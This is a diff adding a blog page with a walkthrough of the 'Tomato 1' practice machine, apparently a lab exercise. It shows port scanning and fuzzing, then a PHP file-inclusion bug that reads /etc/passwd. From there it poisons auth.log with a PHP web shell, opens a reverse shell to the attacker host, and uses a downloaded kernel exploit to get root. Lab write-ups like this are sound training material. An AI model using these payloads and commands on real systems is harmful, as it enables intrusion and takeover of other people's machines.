@@ -1,0 +1,350 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin SEO tag -->
+<title>Tomato 1 | 0bfxgh0st*</title>
+<meta name="generator" content="0bfxgh0st" />
+<meta property="og:title" content="Tomato 1" />
+<meta name="author" content="0bfxgh0st" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Tomato 1 WriteUp" />
+<meta property="og:description" content="Tomato 1 WriteUp" />
+<link rel="icon" href="/assets/favicon.ico" />
+<link rel="canonical" href="#" />
+<meta property="og:url" content="#" />
+<meta property="og:site_name" content="0bfxgh0st*" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-02-25T00:00:00-05:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Tomato 1" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"0bfxgh0st"},"dateModified":"2020-02-25T00:00:00-05:00","datePublished":"2020-02-25T00:00:00-05:00","description":"Tomato 1 WriteUp","headline":"Welcome To 0bfxgh0st Blog","mainEntityOfPage":{"@type":"WebPage","@id":"#"},"url":"#"}</script>
+<!-- End SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="#" title="0bfxgh0st*" /></head><body><header class="site-header"><nav class="site-nav">
+      
+      <div class="trigger">
+            <a class="page-link" href="../">
+              [R]eturn
+            </a></div>
+    </nav><div class="site-icon">
+    <img src="/assets/default-icon.png" />
+  </div>
+
+</header>
+<main class="page-content" aria-label="Content">
+        <div class="wrapper">
+            <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Tomato 1</h1>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p>Port recognition with<code class="language-plaintext highlighter-rouge">nmap</code></p>
+
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">┌──(root@ghost)-[/home/ghost]
+└─# <span class="s2">nmap</span> --min-rate 5000 -sV tomato.vuln      
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-02 20:19 EST
+Nmap scan report for tomato.vuln (10.0.2.85)
+Host is up (0.000057s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 3.0.3
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+8888/tcp open  http    nginx 1.10.3 (Ubuntu)
+MAC Address: 08:00:27:F6:72:4A (Oracle VirtualBox virtual NIC)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 6.36 seconds
+</code></pre></figure>
+<p>Nmap reports three ports open, 21 for ftp, 80 for apache server and 8888 for nginx server </p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">┌──(root@ghost)-[/home/ghost]
+└─# <span class="s2">wfuzz</span> -t 100 -c --hc=404 -z file,/usr/share/dirb/wordlists/common.txt http://tomato.vuln/FUZZ
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://tomato.vuln/FUZZ
+Total requests: 4614
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                           
+=====================================================================
+
+000000001:   200        20 L     49 W       652 Ch      "http://tomato.vuln/"                                                                                                             
+000000011:   403        9 L      28 W       276 Ch      ".hta"                                                                                                                            
+000000013:   403        9 L      28 W       276 Ch      ".htpasswd"                                                                                                                       
+000000012:   403        9 L      28 W       276 Ch      ".htaccess"                                                                                                                       
+000000416:   301        9 L      28 W       318 Ch      "antibot_image"                                                                                                                   
+000002020:   200        20 L     49 W       652 Ch      "index.html"                                                                                                                      
+000003588:   403        9 L      28 W       276 Ch      "server-status"                                                                                                                   
+
+Total time: 3.280437
+Processed Requests: 4614
+Filtered Requests: 4607
+Requests/sec.: 1406.519
+</code></pre></figure>
+
+<p>Fuzzing apache webserver we found antibot_image folder</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">┌──(root@ghost)-[/home/ghost]
+└─# <span class="s2">curl</span> -s http://tomato.vuln/antibot_image/antibots/info.php | grep "<\!--"
+&lt!-- &lt/?php include $_GET['image']; --&gt
+</code></pre></figure>
+
+<p>After browsing through indexed files and folders we found info.php, here looking for comented lines</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">┌──(root@ghost)-[/home/ghost]
+└─# <span class="s2">wfuzz</span> -t 100 -c --hc=404 --hw=5074 -z file,/usr/share/dirb/wordlists/common.txt http://tomato.vuln/antibot_image/antibots/info.php?FUZZ=/etc/passwd
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://tomato.vuln/antibot_image/antibots/info.php?FUZZ=/etc/passwd
+Total requests: 4614
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                           
+=====================================================================
+
+000001985:   200        1023 L   5115 W     86380 Ch    "image"                                                                                                                           
+
+Total time: 10.15646
+Processed Requests: 4614
+Filtered Requests: 4612
+Requests/sec.: 454.2920
+</code></pre></figure>
+
+<p>We found a Local File Inclusion</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">┌──(root@ghost)-[/home/ghost]
+└─# <span class="s2">python3</span> lfienum http://tomato.vuln/antibot_image/antibots/info.php?image= --only-url
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/passwd
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/apache2/apache2.conf
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/crontab
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/fstab
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/hosts
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/hosts.allow
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/hosts.deny
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/issue
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/lsb-release
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/mtab
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/network/interfaces
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/networks
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/profile
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/resolv.conf
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/ssh/ssh_config
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/ssh/sshd_config
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/ssh/ssh_host_dsa_key.pub
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/vsftpd.conf
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/proc/cpuinfo
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/proc/filesystems
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/proc/interrupts
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/proc/ioports
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/proc/meminfo
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/proc/modules
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/proc/mounts
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/proc/sched_debug
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/proc/stat
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/proc/swaps
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/proc/version
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/proc/self/net/arp
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/var/log/auth.log
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/var/log/dpkg.log
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/var/log/faillog
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/var/log/lastlog
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/var/log/wtmp
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/var/run/utmp
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/adduser.conf
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/apache2/envvars
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/apache2/mods-available/autoindex.conf
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/apache2/mods-available/deflate.conf
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/apache2/mods-available/dir.conf
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/apache2/mods-available/mime.conf
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/apache2/mods-available/proxy.conf
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/apache2/mods-available/setenvif.conf
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/apache2/mods-available/ssl.conf
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/apache2/mods-enabled/alias.conf
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/apache2/mods-enabled/deflate.conf
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/apache2/mods-enabled/dir.conf
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/apache2/mods-enabled/mime.conf
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/apache2/mods-enabled/negotiation.conf
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/apache2/mods-enabled/status.conf
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/apache2/ports.conf
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/bash.bashrc
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/ca-certificates.conf
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/debconf.conf
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/debian_version
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/default/grub
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/deluser.conf
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/dhcp/dhclient.conf
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/ftpusers
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/fuse.conf
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/group
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/hdparm.conf
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/host.conf
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/hostname
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/issue.net
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/kbd/config
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/kernel-img.conf
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/ld.so.conf
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/ldap/ldap.conf
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/login.defs
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/logrotate.conf
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/ltrace.conf
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/manpath.config
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/modules
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/nginx/nginx.conf
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/os-release
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/pam.conf
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/security/access.conf
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/security/group.conf
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/security/limits.conf
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/security/namespace.conf
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/security/pam_env.conf
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/security/sepermit.conf
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/security/time.conf
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/sensors3.conf
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/sysctl.conf
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/sysctl.d/10-console-messages.conf
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/sysctl.d/10-network-security.conf
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/timezone
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/etc/updatedb.conf
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/proc/devices
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/proc/net/tcp
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/proc/net/udp
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/proc/self/cmdline
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/proc/self/mounts
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/proc/self/stat
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/proc/self/status
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/usr/share/adduser/adduser.conf
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/var/log/nginx/access.log
+> http://tomato.vuln/antibot_image/antibots/info.php?image=/var/log/nginx/error.log 
+</code></pre></figure>
+
+<p>Extracting vulnerable urls with <a href="https://github.com/0bfxgh0st/lfienum" target="_blank">lfienum</a></p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">┌──(root@ghost)-[/home/ghost]
+└─# <span class="s2">python3</span> lfi2rce http://tomato.vuln/antibot_image/antibots/info.php?image= ssh 10.0.2.15 1337
+lfi2rce - Local File Inclusion To Remote Code Execution v1.0 by 0bfxgh0st*
+
+💀 Poison /var/log/auth.log
+💀 Sending payload
+
+&lt?php system($_GET["cmd"]); ?&gt@tomato.vuln's password: 
+Permission denied, please try again.
+&lt?php system($_GET["cmd"]); ?&gt@tomato.vuln's password: 
+Permission denied, please try again.
+&lt?php system($_GET["cmd"]); ?&gt@tomato.vuln's password: 
+&lt?php system($_GET["cmd"]); ?&gt@tomato.vuln: Permission denied (publickey,password).
+listening on [any] 1337 ...
+connect to [10.0.2.15] from tomato.vuln [10.0.2.85] 52974
+bash: cannot set terminal process group (778): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@ubuntu:/var/www/html/antibot_image/antibots$ 
+</code></pre></figure>
+
+<p>Checking if /var/log/auth.log is poisoneable and obtaining a reverse shell with <a href="https://github.com/0bfxgh0st/lfi2rce" target="_blank">lfi2rce</a></p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">www-data@ubuntu:/var/www/html/antibot_image/antibots$ uname -a && lsb_release -a
+Linux ubuntu 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
+No LSB modules are available.
+Distributor ID: Ubuntu
+Description:    Ubuntu 16.04 LTS
+Release:        16.04
+Codename:       xenial
+</code></pre></figure>
+
+<p>Listing system and distribution information for possible kernel vulnerabilities</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">┌──(root@ghost)-[/home/ghost]
+└─# <span class="s2">searchsploit</span> "Linux Kernel Ubuntu 16.04 privilege escalation"
+----------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                                   |  Path
+----------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Linux Kernel (Debian 7.7/8.5/9.0 / Ubuntu 14.04.2/16.04.2/17.04 / Fedora 22/25 / CentOS 7.3.1611) - 'ldso_hwcap_64 Stack Clash' Local Privilege Escalation       | linux_x86-64/local/42275.c
+Linux Kernel (Debian 9/10 / Ubuntu 14.04.5/16.04.2/17.04 / Fedora 23/24/25) - 'ldso_dynamic Stack Clash' Local Privilege Escalation                              | linux_x86/local/42276.c
+Linux Kernel 4.4 (Ubuntu 16.04) - 'BPF' Local Privilege Escalation (Metasploit)                                                                                  | linux/local/40759.rb
+Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - 'AF_PACKET' Race Condition Privilege Escalation                                                                 | linux_x86-64/local/40871.c
+Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter 'target_offset' Out-of-Bounds Privilege Escalation                                                          | linux_x86-64/local/40049.c
+Linux Kernel 4.4.0-21 < 4.4.0-51 (Ubuntu 14.04/16.04 x64) - 'AF_PACKET' Race Condition Privilege Escalation                                                      | windows_x86-64/local/47170.c
+Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' bpf(BPF_PROG_LOAD) Privilege Escalation                                                                     | linux/local/39772.txt
+Linux Kernel 4.6.2 (Ubuntu 16.04.1) - 'IP6T_SO_SET_REPLACE' Local Privilege Escalation                                                                           | linux/local/40489.txt
+Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation                                                                                    | linux/local/45010.c
+Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                                                                                           | linux/local/44298.c
+Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset' Local Privilege Escalation                                                                | linux_x86-64/local/44300.c
+Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR / SMEP)                                                            | linux/local/43418.c
+Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Privilege Escalation (KASLR / SMEP)                                        | linux/local/47169.c
+----------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+</code></pre></figure>
+
+<p>We are going to use Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation linux/local/45010.c</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">┌──(root@ghost)-[/home/ghost]
+└─# <span class="s2">gcc</span> 45010.c -o exploit
+</code></pre></figure>
+
+<p>Compile the exploit with the correct library version</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">www-data@ubuntu:/tmp$ wget -q http://10.0.2.15/exploit
+www-data@ubuntu:/tmp$ chmod +x exploit
+</code></pre></figure>
+
+<p>Download the exploit to target machine and give executable permissions</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">www-data@ubuntu:/tmp$ ./exploit
+[.] 
+[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
+[.] 
+[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
+[.] 
+[*] creating bpf map
+[*] sneaking evil bpf past the verifier
+[*] creating socketpair()
+[*] attaching bpf backdoor to socket
+[*] skbuff => ffff880035dd4c00
+[*] Leaking sock struct from ffff8800449bab40
+[*] Sock->sk_rcvtimeo at offset 472
+[*] Cred structure at ffff880043205840
+[*] UID from cred structure: 33, matches the current: 33
+[*] hammering cred structure at ffff880043205840
+[*] credentials patched, launching shell...
+# cat /root/proof.txt
+Sun_CSR_TEAM_TOMATO_JS_0232xx23
+</code></pre></figure>
+
+<p>After executing the exploit we are root</p>
+
+  </div>
+
+  <p class="post-meta"><time class="dt-published" datetime="2020-02-25T00:00:00-05:00" itemprop="datePublished">
+        Mar 2, 2023
+      </time>• 
+        <span itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <span class="p-author h-card" itemprop="name">0bfxgh0st</span></span></p>
+  
+
+  <a class="u-url" href="#" hidden></a>
+</article>
+
+  </div>
+        </div>
+    </main><footer class="site-footer h-card">
+    <data class="u-url" href="/"></data>
+
+    <div class="wrapper">
+
+        <div class="footer">
+
+        </div>
+    </div>
+
+</footer>
+</body>
+
+</html>
